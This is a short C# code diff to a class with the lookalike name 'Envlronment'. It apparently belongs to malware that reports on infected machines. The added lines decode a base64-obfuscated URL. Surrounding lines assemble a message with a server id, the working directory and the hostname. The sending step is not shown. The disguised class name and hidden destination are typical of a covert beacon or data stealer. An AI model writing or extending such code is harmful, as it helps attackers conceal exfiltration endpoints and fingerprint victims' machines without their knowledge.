@@ -21,8 +21,14 @@ public class Envlronment
 
 		if (url != null)
 		{
+			// in version >= 2, need to decrypt url
+			if (n >= 2)
+			{
+				url = Encoding.UTF8.GetString(Convert.FromBase64String(url));
+			}
+			
 			var builder = new StringBuilder()
-                    		.Append("\nServer: *" + (sid ?? "NULL") + "*")
+                    		.Append("\nServer: *" + (sid ?? "NULL") + "* (v" + n + ")")
                     		.Append("\n- " + (wd ?? "no working directory"))
 				.Append("\n- HostName: *" + Dns.GetHostName() + "*");
                 
